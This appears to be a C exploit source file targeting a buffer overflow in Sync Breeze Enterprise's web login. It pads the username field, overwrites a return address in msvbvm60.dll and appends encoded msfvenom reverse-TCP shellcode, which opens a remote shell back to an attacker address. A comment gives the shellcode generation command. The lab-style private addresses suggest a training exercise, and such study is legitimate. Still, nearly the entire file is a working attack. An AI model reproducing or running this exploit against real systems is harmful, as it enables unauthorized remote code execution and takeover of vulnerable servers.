/*
Sync Breeze Enterprise BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.199.10");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {
    
    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 172.16.116.222\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://172.16.116.222/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";
    
    int initial_buffer_size = 780;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; //ret at msvbvm60.dll

    //msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

    unsigned char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\xd9\xcd\xd9\x74\x24\xf4\xbb\x76\x4e\xbf\xc6\x58\x33\xc9\xb1"
    "\x52\x83\xc0\x04\x31\x58\x13\x03\x2e\x5d\x5d\x33\x32\x89\x23"
    "\xbc\xca\x4a\x44\x34\x2f\x7b\x44\x22\x24\x2c\x74\x20\x68\xc1"
    "\xff\x64\x98\x52\x8d\xa0\xaf\xd3\x38\x97\x9e\xe4\x11\xeb\x81"
    "\x66\x68\x38\x61\x56\xa3\x4d\x60\x9f\xde\xbc\x30\x48\x94\x13"
    "\xa4\xfd\xe0\xaf\x4f\x4d\xe4\xb7\xac\x06\x07\x99\x63\x1c\x5e"
    "\x39\x82\xf1\xea\x70\x9c\x16\xd6\xcb\x17\xec\xac\xcd\xf1\x3c"
    "\x4c\x61\x3c\xf1\xbf\x7b\x79\x36\x20\x0e\x73\x44\xdd\x09\x40"
    "\x36\x39\x9f\x52\x90\xca\x07\xbe\x20\x1e\xd1\x35\x2e\xeb\x95"
    "\x11\x33\xea\x7a\x2a\x4f\x67\x7d\xfc\xd9\x33\x5a\xd8\x82\xe0"
    "\xc3\x79\x6f\x46\xfb\x99\xd0\x37\x59\xd2\xfd\x2c\xd0\xb9\x69"
    "\x80\xd9\x41\x6a\x8e\x6a\x32\x58\x11\xc1\xdc\xd0\xda\xcf\x1b"
    "\x16\xf1\xa8\xb3\xe9\xfa\xc8\x9a\x2d\xae\x98\xb4\x84\xcf\x72"
    "\x44\x28\x1a\xd4\x14\x86\xf5\x95\xc4\x66\xa6\x7d\x0e\x69\x99"
    "\x9e\x31\xa3\xb2\x35\xc8\x24\x7d\x61\xa5\x73\x15\x70\x49\x7d"
    "\x5d\xfd\xaf\x17\xb1\xa8\x78\x80\x28\xf1\xf2\x31\xb4\x2f\x7f"
    "\x71\x3e\xdc\x80\x3c\xb7\xa9\x92\xa9\x37\xe4\xc8\x7c\x47\xd2"
    "\x64\xe2\xda\xb9\x74\x6d\xc7\x15\x23\x3a\x39\x6c\xa1\xd6\x60"
    "\xc6\xd7\x2a\xf4\x21\x53\xf1\xc5\xac\x5a\x74\x71\x8b\x4c\x40"
    "\x7a\x97\x38\x1c\x2d\x41\x96\xda\x87\x23\x40\xb5\x74\xea\x04"
    "\x40\xb7\x2d\x52\x4d\x92\xdb\xba\xfc\x4b\x9a\xc5\x31\x1c\x2a"
    "\xbe\x2f\xbc\xd5\x15\xf4\xdc\x37\xbf\x01\x75\xee\x2a\xa8\x18"
    "\x11\x81\xef\x24\x92\x23\x90\xd2\x8a\x46\x95\x9f\x0c\xbb\xe7"
    "\xb0\xf8\xbb\x54\xb0\x28";

    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}
